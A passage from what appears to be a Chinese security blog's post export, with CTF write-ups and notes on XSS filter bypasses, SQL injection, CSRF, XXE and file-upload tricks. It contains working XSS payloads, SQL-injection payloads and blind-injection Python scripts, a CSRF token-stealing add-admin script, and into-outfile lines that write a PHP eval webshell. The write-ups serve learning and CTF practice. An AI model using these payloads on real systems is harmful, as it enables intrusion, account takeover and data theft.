其实两种方法原理都差不多，先来说第一种吧我们前面已经说到过js编码不能绕过过滤的()，所以只能想其他的编码方式而这里使用的是HTML编码，因为我发现在 &lt;script&gt;标签里面的HTML编码是不能被浏览器解析的而这里由于是在img标签内，可以解析HTMl编码，所以还原除了小括号，然后执行了js代码第二个payload其实原理相同，也是svg标签可以HTML编码的原理 0x05--!>&lt;script>alert(1)&lt;/script>&lt;!-- 这道题考察了html注释符后面的感叹号可有可无 0x06先看看server code function render (input) { input = input.replace(/auto|on.*=|>/ig, '_') return `&lt;input value=1 ${input} type=\"text\">` } 这里要注意 |是或的意思，有整体分割的作用，匹配auto或者on.*&#x3D;或者&gt;而且全局匹配且不区分大小写，那么闭合标签和auto事件就不能用了然而正则里面的 .是匹配除”\\n”之外的任何单个字符，所以我们使用换行就可以绕过了 onmouseover =alert(1) 0x07server code: function render (input) { const stripTagsRe = /&lt;\\/?[^>]+>/gi input = input.replace(stripTagsRe, '') return `&lt;article>${input}&lt;/article>` } 再讲讲正则，首先匹配一个 &lt;然后 /有或者没有都可以，再去匹配除了 &gt;的任意字符一个或多个，再以 &gt;结尾这样的话可以利用浏览器的容错性，实际上如果你img标签没有闭合的话浏览器也是可以正常执行的 &lt;img src=1 onerror=alert(1) 而又由于这里的img标签又在article标签中，而且在同一行，所以需要在结尾加上一个空格或者回车浏览器才能正常执行 0x08server code: function render (src) { src = src.replace(/&lt;\\/style>/ig, '/* \\u574F\\u4EBA */') return ` &lt;style> ${src} &lt;/style> ` } 题目的想法也就是不想让你闭合style标签这里的技巧是利用在标签结尾的地方增加空格或者使用回车不影响解析 &lt;/style > &lt;script>alert(1)&lt;/script> 或者 &lt;/style > &lt;script>alert(1)&lt;/script> 0x09server code: function render (input) { let domainRe = /^https?:\\/\\/www\\.segmentfault\\.com/ if (domainRe.test(input)) { return `&lt;script src=\"${input}\">&lt;/script>` } return 'Invalid URL' } 由于正则只匹配开头而没有匹配结尾，导致后面可以继续植入代码可以先闭合前面的双引号，在后面js标签中再用 //注释掉后面的双引号 https://www.segmentfault.com\">alert(1)// 当然也可以用onload事件 https://www.segmentfault.com\" onload = alert(1) \" 0x0Aserver code: function render (input) { function escapeHtml(s) { return s.replace(/&amp;/g, '&amp;') .replace(/'/g, ''') .replace(/\"/g, '\"') .replace(/&lt;/g, '&lt;') .replace(/>/g, '>') .replace(/\\//g, '/') } const domainRe = /^https?:\\/\\/www\\.segmentfault\\.com/ if (domainRe.test(input)) { return `&lt;script src=\"${escapeHtml(input)}\">&lt;/script>` } return 'Invalid URL' } 由于这道题目和上一题很像，所以我一开始想到的是闭合双引号，但是在标签的属性值里HTML对双引号编码是无效的，只会当作普通文本，所以只能另外想办法比较好的办法是去引用外部js代码，不过我倒是搜出来很多奇怪的技巧，有用@的（不知道有没有这个方法），有去新注册一个国家级域名的，不过比较好的还是就地取材：在目标url里是一个论坛网站，可以新建一个笔记，内容为 alert(1)然后点击raw功能，引入这个文件就可以了还有一个坑点在于这个替换规则没有使用 ;导致 /在编码的时候和后面的数字连在一起成了不可见字符无法识别url在浏览器里按下F12就能看到详细错误链接被识别为了 https://segmentfault.com/n%EF%BF%BD/raw解决的办法也很简单，加上 ;或者使用换行 https://www.segmentfault.com/n/;1330000016099466/raw https://www.segmentfault.com/n/ 1330000016099466/raw 0x0Bserver code: function render (input) { input = input.toUpperCase() return `&lt;h1>${input}&lt;/h1>` } 这道题的考点在于HTML的标签（包括script）不区分大小写，但是js的函数是区分的正解是用编码绕过，或者引入外部js文件一开始想的是js编码，但是很遗憾 U大写后识别不出来，只能用没有大小写区分的HTML编码 0x0Cserver code: function render (input) { input = input.replace(/[&lt;/\"']/g, '') return ` &lt;script> // alert('${input}') &lt;/script> ` } 和上面一题一样，不能用script，但是由于这里的替换只替换了一次，而且是替换字符串并且替换为空，所以可以用双写绕过 &lt;/h1>&lt;img src=1 onerror = alert(1)> &lt;scripscriptt src=\"https://xss.haozi.me/j.js\">&lt;/scripscriptt> 0x0Dserver code: function render (input) { input = input.replace(/[&lt;/\"']/g, '') return ` &lt;script> // alert('${input}') &lt;/script> ` } 首先这里双斜线只能注释单行，回车就可以绕过，还剩下的 &#39;)可以用HTML的注释符 --&gt;饶过这是一个技巧，js里面同样可以用HTML的注释符，各自用一半均有注释一行的效果，而使用 --&gt;的时候前面不能有东西，否则会语法报错 alert(1) --> 0x0Eserver code: function render (input) { input = input.replace(/&lt;([a-zA-Z])/g, '&lt;_$1') input = input.toUpperCase() return '&lt;h1>' + input + '&lt;/h1>' } 这道题将返回的第一个匹配（$1）替换成 &lt;_，首先想到的当然还是编码，我想用HTML编码 img但是后来发现并不行，标签名编码没有用这道题用到的是古英语，ſ大写过后即是 S &lt;ſcript src=\"https://xss.haozi.me/j.js\">&lt;/script> 0x0Fserver code: function render (input) { function escapeHtml(s) { return s.replace(/&amp;/g, '&amp;') .replace(/'/g, ''') .replace(/\"/g, '\"') .replace(/&lt;/g, '&lt;') .replace(/>/g, '>') .replace(/\\//g, '/') } return `&lt;img src onerror=\"console.error('${escapeHtml(input)}')\">` } 这里对上述符号均进行的是HTML编码，并没有什么屌用，浏览器解析的时候会还原出来，直接闭合就好了 ');alert('1 0x10不懂这道题的意义，直接弹 1;alert(1) 0x11server code: // from alf.nu function render (s) { function escapeJs (s) { return String(s) .replace(/\\\\/g, '\\\\\\\\') .replace(/'/g, '\\\\\\'') .replace(/\"/g, '\\\\\"') .replace(/`/g, '\\\\`') .replace(/&lt;/g, '\\\\74') .replace(/>/g, '\\\\76') .replace(/\\//g, '\\\\/') .replace(/\\n/g, '\\\\n') .replace(/\\r/g, '\\\\r') .replace(/\\t/g, '\\\\t') .replace(/\\f/g, '\\\\f') .replace(/\\v/g, '\\\\v') // .replace(/\\b/g, '\\\\b') .replace(/\\0/g, '\\\\0') } s = escapeJs(s) return ` &lt;script> var url = 'javascript:console.log(\"${s}\")' var a = document.createElement('a') a.href = url document.body.appendChild(a) a.click() &lt;/script> ` } 要看懂题目，这里替换的字符串里的“两个反斜线”其实是指替换成一个反斜线，因为还要起到一个转义的作用先看payload： \");alert(\"1 主要原因如下： \\本身是作为转义符号的，转义后面紧接的字符，有的字符转义会变成其他具体含义，像 \\n之类的，&quot;被转义他仍是双引号，只是在当前失去意义而已，而这里由于外面包裹的是单引号，里面的内容被认为是一个字符串，双引号本身就没有实际含义，所以这里使用 \\&quot;其实是没有用的，而在后面被拼接到href后，就会发挥双引号作用 如果截图浏览器Element选项就能看到a标签： 0x12server code: // from alf.nu function escape (s) { s = s.replace(/\"/g, '\\\\\"') return '&lt;script>console.log(\"' + s + '\");&lt;/script>' } 只替换一次，自己再加上一个反斜线转义前面的反斜线即可 \\\");alert(1)// 总结还是学到了些东西，尤其是正则的匹配以及编码的知识 参考文章haozi&#x2F;xss-demo 在线做题笔记新的xss挑战","categories":[{"name":"Web","slug":"Web","permalink":"https://0xr1ngs.github.io/categories/Web/"}],"tags":[{"name":"xss","slug":"xss","permalink":"https://0xr1ngs.github.io/tags/xss/"}]},{"title":"实验吧-因吹斯汀的绕过-writeup","slug":"interesting","date":"2018-07-12T12:10:50.000Z","updated":"2023-07-10T09:48:47.923Z","comments":true,"path":"2018/07/12/interesting/","link":"","permalink":"https://0xr1ngs.github.io/2018/07/12/interesting/","excerpt":"","text":"payload1' or 1=1 group by pwd with rollup limit 1 offset 2 # 后台核心代码$filter = \"and|select|from|where|union|join|sleep|benchmark|,|\\(|\\)\"; mysql_select_db($db, $con); $sql=\"SELECT * FROM interest WHERE uname = '{$_POST['uname']}'\"; $query = mysql_query($sql); if (mysql_num_rows($query) == 1) { $key = mysql_fetch_array($query); if($key['pwd'] == $_POST['pwd']) { print \"CTF{XXXXXX}\"; }else{ print \"亦可赛艇！\"; } }else{ print \"一颗赛艇！\"; } 带入uname的值查询 如果查询结果的行的数目为1的话（查询成功）继续执行,如果输入的pwd和查询的pwd相同的话输出flag 本地测试mysql> select * from demo where password = '' or 1=1; +-------+----------+------+ | name | password | id | +-------+----------+------+ | admin | admin888 | 1 | | user1 | pass2 | 2 | | user2 | pass3 | 3 | +-------+----------+------+ 3 rows in set (0.00 sec) mysql> select * from demo where password = '' or 1=1 group by password with rollup; +-------+----------+------+ | name | password | id | +-------+----------+------+ | admin | admin888 | 1 | | user1 | pass2 | 2 | | user2 | pass3 | 3 | | user2 | NULL | 3 | +-------+----------+------+ 4 rows in set (0.00 sec) or 1&#x3D;1可以返回所有的结果，而如果查询的结果超过两行，with rollup就会多返回一行，并且password（由group by 决定）为NULL，再加入limit 1就可以只返回一行，而用offset，表示返回哪一行，null结果是在最后一行插入的，所以offset要指向最后一行，但我们并不知道最后一行的行数是几，所以用二分法测试 超过行数的话就会返回empty set，也就是没有返回一行而查询失败，所以只要测试出最后null的行数，此时查询成功返回的就是任意的一个uname和password为NULL的结果，此时密码一项不填为空，null和null相等就可以得到flag mysql> select * from demo where password = '' or 1=1 group by password with rollup limit 1 offset 3; +-------+----------+------+ | name | password | id | +-------+----------+------+ | user2 | NULL | 3 | +-------+----------+------+ 1 row in set (0.00 sec)","categories":[{"name":"CTF","slug":"CTF","permalink":"https://0xr1ngs.github.io/categories/CTF/"}],"tags":[{"name":"sqli","slug":"sqli","permalink":"https://0xr1ngs.github.io/tags/sqli/"}]},{"title":"csrf","slug":"csrf","date":"2018-06-09T09:18:33.000Z","updated":"2023-07-10T09:51:18.054Z","comments":true,"path":"2018/06/09/csrf/","link":"","permalink":"https://0xr1ngs.github.io/2018/06/09/csrf/","excerpt":"","text":"请求方式get利用html里的带src属性的元素发出跨域请求 post document.getElementById(\"hack\").submit(); 防御方法验证referer data:协议访问和https向http跳转时候referer为空 把文件放在一个GOOGLE.COM的目录，绕过关键字验证 使用验证码影响用户体验 使用csrf token攻击者无法使用js获取外域页面的token值，遵循同源策略 配合xss攻击如果网站还存在着一个xss漏洞，可以用xss窃取同域的csrftoken然后发起csrf攻击可以在有xss漏洞的页面嵌入以下代码 没有过滤script关键字 var frameObj = document.createElement(\"iframe\"); frameObj.setAttribute(\"id\", \"add\"); document.body.appendChild(frameObj); document.getElementById(\"add\").src = \"admin.php?c=admin&f=save\"; var token = document.getElementById(\"add\").contentWindow.document.getElementById(\"token\").value; //从iframe中的页面中获取token值 var xmlhttp; if (window.XMLHttpRequest) { // code for IE7+, Firefox, Chrome, Opera, Safari xmlhttp = new XMLHttpRequest(); } else { // code for IE6, IE5 xmlhttp = new ActiveXObject(\"Microsoft.XMLHTTP\"); } xmlhttp.open(\"POST\", \"admin.php?c=admin&f=save\", true); xmlhttp.send(\"id=1&accont=wooyun&pass=123456&status=1&if_system=1&token=\"+token); //带上token提交添加管理员的请求 过滤关键字，加载远程的js代码","categories":[{"name":"Web","slug":"Web","permalink":"https://0xr1ngs.github.io/categories/Web/"}],"tags":[{"name":"csrf","slug":"csrf","permalink":"https://0xr1ngs.github.io/tags/csrf/"}]},{"title":"xxe总结","slug":"xxe","date":"2018-06-02T11:12:55.000Z","updated":"2023-07-10T09:15:33.882Z","comments":true,"path":"2018/06/02/xxe/","link":"","permalink":"https://0xr1ngs.github.io/2018/06/02/xxe/","excerpt":"","text":"xmlxml是一种标记语言，设计宗旨是传输数据，需要自定义标签，他仅仅是纯文本而已 xml声明 根元素 必须有 George 4个子元素 子元素还可以有子元素 John Reminder Don't forget the meeting! dtd 文档类型定义dtd的作用是定义xml文档的合法构建模块 内部dtd可被成行地声明于xml文档中，也可以作为一个外部引用 外部dtd如果部署在外部，则应该这样声明 George John Reminder Don't forget the meeting! 外部的note.dtd文件 实体实体是用于定义引用普通文本或特殊字符的快捷方式的变量实体可以在内部或者外部声明 内部实体一个实体由一个&amp;，一个实体名称，一个;构成 在dtd里声明 &writer; xml里引用 外部实体 &writer; 参数实体仅仅在dtd中使用的解析实体为参数实体 内部 外部 在dtd内引用： %writer; 漏洞利用php里的simplexml_load_string在旧版本里默认解析外部实体 如果网站解析的xml是外部可控的，或者在与服务器交互的时候将json数据格式改为xml，都可能会导致服务器解析恶意的xml脚本 读取文件&#x2F;&#x2F;不同程序支持协议不一样 读取失败的时候可以考虑php:&#x2F;&#x2F;filter &xxe; 没有数据回显的时候有的解析器不能在实体定义的时候引用参数实体，所以要把声明放到攻击者的服务器漏洞复现： 远程的dtd文件 dos攻击 &lol9; 还有执行系统命令，探测内网端口等效果 防御 禁止使用外部实体 PHP： libxml_disable_entity_loader(true); JAVA: DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance(); dbf.setExpandEntityReferences(false); Python： from lxml import etree xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 过滤用户提交的xml数据 赛总♂牛逼在写这篇文章的时候翻了一下之前和赛总的聊天记录，赛总之前教了我一个没有vps也能实现blind xxe的黑魔法 burp collaborator clientburp里的这个功能可以随机生成一条由burp.collaborator.server分给你的链接，任何访问了这个链接的请求都会被记录下来，当关掉这个面板的时候链接失效 githubgithub上可以托管代码文件，raw功能预览代码，此时url就可以作为远程文件的链接 https://raw.githubusercontent.com/R1ng6/CTFtool/master/evil.dtd 但是当时我找了一个普通的xxe的ctf题目，发现调用参数实体的时候无法访问dtd文件里面指向的collaborator链接后来发现是默认不支持协议github上的链接是https协议，php默认不支持 搭博客，买域名正好之前用github搭建了博客，还买了域名进行重定向，用域名访问博客地址就是http协议，于是我马上试了一下在靶机里面的xml $xml = ' &external;'; github上的dtd 只是不知道为什么github上只能命名为dtd，如果是xml的话访问链接会报404最后成功读取到了靶机目录下的1.txt文件","categories":[{"name":"Web","slug":"Web","permalink":"https://0xr1ngs.github.io/categories/Web/"}],"tags":[{"name":"xxe","slug":"xxe","permalink":"https://0xr1ngs.github.io/tags/xxe/"}]},{"title":"文件上传","slug":"file-upload","date":"2018-05-31T13:11:43.000Z","updated":"2023-07-10T09:13:33.044Z","comments":true,"path":"2018/05/31/file-upload/","link":"","permalink":"https://0xr1ngs.github.io/2018/05/31/file-upload/","excerpt":"","text":"客户端检验一般使用js代码检验后缀名可以先命名为jpg然后再抓包更改为php上传或者直接禁用js 服务端 将文件后缀名改为1.aaaaa这种不存在的文件 如果正常上传，说明黑名单规则 反之白名单规则 黑名单拓展名黑名单绕过在黑名单里设有php,php2,php3.phtml等 可以用evil.Php.aaa，apache如果解析不了.aaa拓展名，会继续向前寻找可以解析的拓展名 尝试大小写绕过或者找拓展名的漏网之鱼 jsp：jspx、jspf； asp：asa、cer、aspx； php：php、php2、php3、php4、php5、phps、pht、phtm、phtml； exe：exee 白名单0x01 content-type文件类型 抓包的时候改为image&#x2F;gif0x02 文件头绕过 在文件头加上文件信息，比如 GIF89a %00截断00在ascii里表示NULL，当系统读取到0x00时认为文件名已经结束 通过抓包将evil.php1.jpg的1换成0x00从而上传evil.php 也可以是路径&#x2F;upload&#x2F;1.php(0x00) 文件名1.jpg 结合后为&#x2F;upload&#x2F;1.php(0x00)&#x2F;1.jpg存入 重写解析规则上传.htaccess文件，重写解析规则，将图片用脚本方式解析在可以上传.htaccess文件时上传这个文件，文件内容如下,然后再上传evil.gif就可以让它以php方式解析 &lt;FilesMatch &quot;evil.gif&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; ADS流文件ADS是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都可以存在多个数据流，即除了主文件流之外还可以有许多非主文件流寄宿在主文件流中。 上传1.php文件的时候改包为1.php:1.jpg即就是上传一个1.jpg的内容为上传前的1.php的内容的数据流文件，且与宿主文件1.php关联。 最后上传到服务器的是1.php文件，文件内容为空，在目录下使用命令 notepad 1.php:1.jpg 就可以看到1.jpg文件的内容即之前的1.php的内容可以再结合文件包含把1.php:1.jpg包含进来，达到代码执行的作用 :$DATA默认数据流 NTFS文件系统包含对备用数据流的支持，备用数据流允许文件包含多个数据流。每个文件至少有一个数据流，windows中的默认数据流就是:$DATA 1.php::$DATA 生成1.php &lt;?php phpinfo();?&gt; 1.php::$INDEX_ALLOCATION 生成1.php文件夹 windows系统windows系统不允许文件名包含下列任何字符 /\\:*?|\" 可以在发包的时候改为1.php&#x2F;1.jpg上传的时候会自动删除不规范字符后面的内容，但是文件内容为空如果服务器使用黑名单的思想去校验我们可以覆盖文件内容，并且没有重命名文件，那么就可以再次上传覆盖由windows搜索文件名的特性: &lt; 符号可以匹配任意字符如果我们的文件为1.php，那么再上传一个1.&lt;&lt;&lt;，内容为webshell，那么就可以把webshell写入1.php了补充： php对文件做处理的函数使用的时候会调用一个windows的底层api 使用 &lt;可以匹配任意单字符，&lt;&lt;则可以匹配任意字符，相当于正则表达式里的 .+ linux系统尝试大小写绕过","categories":[{"name":"Web","slug":"Web","permalink":"https://0xr1ngs.github.io/categories/Web/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"https://0xr1ngs.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"sql注入总结","slug":"sql","date":"2018-05-26T09:18:33.000Z","updated":"2023-07-10T09:15:04.977Z","comments":true,"path":"2018/05/26/sql/","link":"","permalink":"https://0xr1ngs.github.io/2018/05/26/sql/","excerpt":"","text":"思路0x01 参数包裹测试 1 &#39; &quot; ( &#123; 0x02 测试WAF测试空格 uname&#x3D;adm in 和uname&#x3D;admin 有没有被过滤为空用burp里的intruder功能fuzz单字符，字典包含所有的字符标点，–+等 id=1$&#39;$ 测试关键字waf，and，select等 id=1$and$ 依据有差别的注入点，测试替换 id=-1&#39; or &#39;&#39;=&#39;$and$ /*测试有没有被替换为空等*/ 0x03 测试payload根据被waf的关键字和测试出的能被绕过的关键字去构造payload，确定注入的类型，再用脚本 注入类型0x01 联合查询（有数据回显的时候）获取字段数 id=1' order by 3 --+ id=1' union select 1,2,3--+ payload: id=1' union select 1,group_concat(schema_name),3 from information_schema.schemata --+ id=1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+ id=1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='flag' --+ id=1' union select 1,group_concat(flag),3 from table.flag --+ 0x02 报错注入（union被waf或者没有数据回显）fuzz报错函数有没有被waf:floor() extractvalue() updatexml() geometrycollection() multipoint()polygon() multipolygon() linestring() multilinestring() exp()payload: select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a); select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e))); select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1)); select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b)); select * from test where id=1 and multipoint((select * from(select * from(select user())a)b)); select * from test where id=1 and polygon((select * from(select * from(select user())a)b)); select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b)); select * from test where id=1 and linestring((select * from(select * from(select user())a)b)); select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b)); select * from test where id=1 and exp(~(select * from(select user())a)); 0X03 bool盲注（正确和错误两种结果）字符串截取函数: substr(substring),left,right,mid select left((select username from test limit 0,1),2) = 'ad'; /*不能截取单个字符*/ select substr((select username from test limit 1 offset 0)from 1 for 1) = 'a'; /*绕过逗号过滤*/ select mid((select username from test limit 1 offset 0)from 1 for 1) = 'a'; 上脚本，两种思路1） regexp、rlike /*正则 ^和$表示匹配字符串的开头和结尾*/ like /*不用%和等号一个效果*/ = 缺陷 .可以匹配任意字符 当字典迭代到.的时候匹配一定成功 单字符被waf并且匹配的字符串里面有这个单字符的时候比较尴尬 默认不区分大小写字母，需用binary辨别为大写还是小写 2）二分法 结合ascii或者ord或者hex或者char select hex(substring(database(),1,1)) = 74; /*从十进制的32到127的16进制*/ select ascii(substring(database(),1,1)) = 116; select ord(substring(database(),1,1)) = 116; select substring(database(),1,1) = char(116); 一个丑陋的盲注脚本 #!/usr/bin/env python3 # -*- coding: utf-8 -*- import requests def payload(rawstr): newstr = rawstr.replace(' ', chr(0x09)).replace('or', 'Or') # 必须用chr 把16进制转化成字符'\\t' return newstr url = 'http://ctf5.shiyanbar.com/web/earnest/index.php' ses = requests.session() true_state = 'You are in' # database i = 1 raw = \"0' or length(database())=%d or '0\" while 1: rawpay = raw % (i) data = {'id': payload(rawpay)} txt = ses.post(url, data=data).content.decode() if true_state in txt: break i += 1 if i > 100: print('length error!') print(\"database.length:: %d\" % (i)) length = i str = '' raw = \"0' or (select ascii(mid( (select database() limit 1 offset 0) from %d)) > %d) or '0\" # 可以不用for for i in range(length): i += 1 min = 31 max = 126 ''' min和max各自代表ascii可打印字符的上限和下限 ''' while 1: rawpay = raw % (i, (min + max) // 2) data = {'id': payload(rawpay)} txt = ses.post(url, data=data).content.decode() if true_state in txt: if (max - (min + max) // 2) == 1: asc = max str += chr(asc) print(str) break else: min = (max + min) // 2 else: max = (max + min) // 2 print(\"database::%s\" % (str)) 上面的脚本由于题目网络问题跑的有点慢，所以我加上了多线程, 速度提升明显，只是脚本依然丑陋 #! /usr/bin/env python # -*- coding: utf-8 -*- from concurrent.futures import ThreadPoolExecutor import requests, queue def payload(rawstr): newstr = rawstr.replace(' ', chr(0x09)).replace('or', 'Or') # 必须用chr 把16进制转化成字符'\\t' return newstr url = 'http://ctf5.shiyanbar.com/web/earnest/index.php' ses = requests.session() true_state = 'You are in' # database i = 1 raw = \"0' or length(database())=%d or '0\" while 1: print(i) rawpay = raw % i data = {'id': payload(rawpay)} txt = ses.post(url, data=data).content.decode() if true_state in txt: break i += 1 if i > 100: print('length error! please check your payload!') print(\"database.length:: %d\" % (i)) q = queue.Queue(0) length = i def sqli(i): min = 31 max = 126 raw = \"0' or (select ascii(mid( (select database() limit 1 offset 0) from %d)) > %d) or '0\" # 可以不用for while 1: rawpay = raw % (i, (min + max) // 2) data = {'id': payload(rawpay)} txt = ses.post(url, data=data).content.decode() if true_state in txt: if (max - (min + max) // 2) == 1: asc = max q.put((i, chr(asc))) break else: min = (max + min) // 2 else: max = (max + min) // 2 # threads start threads = [] with ThreadPoolExecutor(10) as executor: executor.map(sqli,range(1, length+1)) #get result result = [] while not q.empty(): result.append(q.get()) #sort def get_zero(ele): return ele[0] result.sort(key = get_zero) str = '' for i in range(len(result)): str += result[i][1] print(\"database::%s\" % (str)) 位运算符和算术运算符注入(and or 被waf死) payload: select id from test where id = '0'^(select(ascii(mid(database(),1,1))>1))^'0'; /*括号绕过空格*/ select id from test where id = '0'xor(select(ascii(mid(database(),1,1))>1))xor'0'; select id from test where id = '0'|(select(ascii(mid(database(),1,1))>1))|'0'; select id from test where id = '1'&amp;(select(ascii(mid(database(),1,1))>1))&amp;'1'; select id from test where id = '0'+(select(ascii(mid(database(),1,1))>1))+'0'; select id from test where id = '1'-(select(ascii(mid(database(),1,1))>1))-'0'; select id from test where id = '1'*(select(ascii(mid(database(),1,1))>1))*'1'; select id from test where id = '1'/(select(ascii(mid(database(),1,1))>1))/'1'; 直接查询同一张表的字段 '0'^(select(ascii(mid((select(passwd))from(%d)))>%d))^'1' /*uname和passwd是同一张表的两个字段*/ 0x04 时间盲注（只有一种返回结果）延迟：sleep,benchmark,heavy query（利用information_schema里的表做笛卡尔积运算，返回时间不稳定） select if(2>1, sleep(2), 1); select if(2>1, benchmark(1e7,md5(1)), 1); select if(2>1, (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C), 1); /*时间由columns的数量和服务器处理器性能等决定*/ 过滤了逗号 select case when 2>1 then sleep(2) else 1 end; payload构造的时候注意and和or的短路性，sleep函数是否会被执行 mysql> select id from test where id = '1' and sleep(2); Empty set (2.01 sec) mysql> select id from test where id = '0' and sleep(2); Empty set (0.00 sec) mysql> select id from test where id = '1' or sleep(2); +------+ | id | +------+ | 1 | +------+ 1 row in set (2.01 sec) mysql> select id from test where id = '0' or sleep(2); Empty set (4.03 sec) /*不是很理解这个细节 后面的order by注入也有这个问题*/ 绕过上学期看的一篇绕过的总结，比较基础 宽字节注入（转义单引号）%bf匹配低位\\，低位的范围中要含有0x5c编码再加一个\\构成\\’ 使单引号逃逸 sprintf逃逸单引号在php里sprintf进行拼接的时候%后的内容为格式化类型，如果没有这个类型会输出空 &lt;?php $input1 = \"admin%1$' and 1=1#\"; $input2 = \"\"; $input1 = addslashes($input1); $input2 = addslashes($input2); $sql = \"select * from %s where username = '$input1' and password='$input2';\"; echo sprintf( $sql, \"user\") ; //select * from user where username = 'admin' and 1=1#' and password=''; ?> sprintf格式化字符串带来的注入隐患 load_file和outfilemysql常见的系统函数和变量user() 用户名,current_user 当前用户名,session_user() 连接数据库的用户名 @@hostname 主机名,@@port 数据库端口,version() mysql数据库版本 @@version_compile_os 操作系统,@@datadir 数据库绝对路径,@@basedir mysql绝对路径 测试读写权限 and(select count(*) from mysql.user)>0 --+ 常见用途可以用来写一句话木马 id = -1 union select load_file ('C:/1.bmp') into outfile 'C:/PHPstudy/WWW/1.php' /*结合文件上传*/ id = -1 union select '&lt;?php @eval($_post[cmd])?>' into outfile 'C:/PHPstudy/WWW/1.php'/*直接写*/ id = -1 union select 0x3c3f70687020406576616c28245f706f73745b636d645d293f3e into outfile 'C:/PHPstudy/WWW/2.php' /*一句话可以换成16进制 outfile只能加单引号*/ 如果想用load_file查看文件，特别是exe等可以00截断或者有回车换行的二进制文件时，最好用hex函数然后再转换回来，这样就不存在截断了 id = -1 union select hex(load_file('C:/1.exe')) outfile和dumpfile区别 select * from admin into outfile ‘&#x2F;1.txt’; 可以完整导出每一行记录 而dumpfile只能导出一行数据 对于2进制文件，只能用dumpfile导出，它不对任何列或行进行终止，也不执行任何转义处理 其余操作update,insert,re头,cookie注入与数据库有交互且用户可以控制的地方都可能存在注入demo insert into test values('aa', '' or (extractvalue(1,concat(0x7e,(select user()),0x7e))) or '', '3'); /*报错*/ insert into test values('aa', '' or (select if(2>1, sleep(1), 1)) or '','3');/*时间盲注*/ update test set name = ''or (updatexml(1,concat(0x7e,(select user()),0x7e),1)) or'' where id = 3; update test set name = ''or (select if (2>1,sleep(1), 1)) or'' where id =1; 二次注入从数据库取出的数据完全信任，在存进数据库的时候注入恶意代码 在注册账号时可以恶意注入一些sql语句 然后在重置密码的时候没有对已经在数据库的数据进行过滤导致可以在没有密码的情况下恶意修改某些账号的密码 比如这样可以注册admin’#的账户来修改admin的密码 update users set password = '&amp;pass' where username = 'admin' #' and password = '$curr_pass' 强网杯在注入点只允许注册数字 用16进制绕过 mysql> insert into demo values('root', 0x312d3520756e696f6e2073656c65637420312c3 22c33,4); Query OK, 1 row affected (0.00 sec) mysql> select * from demo; +-------+------------------------+------+ | name | password | id | +-------+------------------------+------+ | admin | admin888 | 1 | | user1 | pass2 | 2 | | user2 | pass3 | 3 | | root | 1-5 union select 1,2,3 | 4 | +-------+------------------------+------+ 4 rows in set (0.00 sec) 取出数据库里的内容后再进行拼接，1-5&#x3D;-4已经不是字段里面可以弱类型的内容了所以不会显示而显示后面union select的内容 mysql> select * from demo where password = 1-5 union select 1,2,3; +------+----------+------+ | name | password | id | +------+----------+------+ | 1 | 2 | 3 | +------+----------+------+ 1 row in set, 4 warnings (0.00 sec) hpf http分割注入 where子句后执行任意不存在函数可以爆出数据库 mysql> select id from test where id = 1 and www(); ERROR 1305 (42000): FUNCTION test.www does not exist 要求同时比对username和password 各自限制一部分 $SQL = \"select * from test where username='$input1' and password = '$input2'\"; payload: username= 1' and updatexml/*&amp;password=*/(1,concat(0x7e,(select database()),0x7e),1) and '1 select * from test where username='1' and updatexml/*' and password = '*/(1,concat(0x7e,(select database()),0x7e),1) and '1' 已知表名不知字段名直接爆数据思想是通过选取派生表让我们的字段名可控，然后联合查询表里的所有内容 mysql> select * from (select 1)a join (select 2)b join (select 3)c; /*用join连接绕过逗号*/ +---+---+---+ | 1 | 2 | 3 | +---+---+---+ | 1 | 2 | 3 | +---+---+---+ 1 row in set (0.00 sec) mysql> select * from (select 1)a join (select 2)b join (select 3)c union select * from test; /*引入test表*/ +-------+-------+------+ | 1 | 2 | 3 | +-------+-------+------+ | 1 | 2 | 3 | | admin | admin | 1 | | root | root | 2 | +-------+-------+------+ 3 rows in set (0.00 sec) mysql> select d.2 from (select * from (select 1)a join (select 2)b join (select 3)c union select * from test)d limit 1 offset 1; /*将上面的结果再作为一个派生表，用d.2和limit,offset访问字段的内容*/ +-------+ | 2 | +-------+ | admin | +-------+ 1 row in set (0.00 sec) mysql> select * from test where id = -1 union select (select d.2 from (select * from (select 1)a join (select 2)b join (select 3)c union select * from test)d li mit 1 offset 1), (select 0)e, (select 0)f; +-------+----------+------+ | name | password | id | +-------+----------+------+ | admin | 0 | 0 | +-------+----------+------+ 1 row in set (0.00 sec) /*也可以用盲注*/ mysql> select * from test where id = 1 and length((select d.2 from (select * fro m (select 1)a join (select 2)b join (select 3)c union select * from test)d limit 1 offset 1)) > 1; +-------+----------+------+ | name | password | id | +-------+----------+------+ | admin | admin | 1 | +-------+----------+------+ 1 row in set (0.00 sec) limit 注入mysql select语句执行顺序原文404了，引用一下别人的吧mysql 5.x的select语法 SELECT [ALL | DISTINCT | DISTINCTROW ] [HIGH_PRIORITY] [STRAIGHT_JOIN] [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] select_expr [, select_expr ...] [FROM table_references [WHERE where_condition] [GROUP BY {col_name | expr | position} [ASC | DESC], ... [WITH ROLLUP]] [HAVING where_condition] [ORDER BY {col_name | expr | position} [ASC | DESC], ...] [LIMIT {[offset,] row_count | row_count OFFSET offset}] [PROCEDURE procedure_name(argument_list)] [INTO OUTFILE 'file_name' export_options | INTO DUMPFILE 'file_name' | INTO var_name [, var_name]] [FOR UPDATE | LOCK IN SHARE MODE]] mysql中在order by前面可以使用union关键字 mysql> select * from test where id > 0 limit 1 union select 1,2,3 from 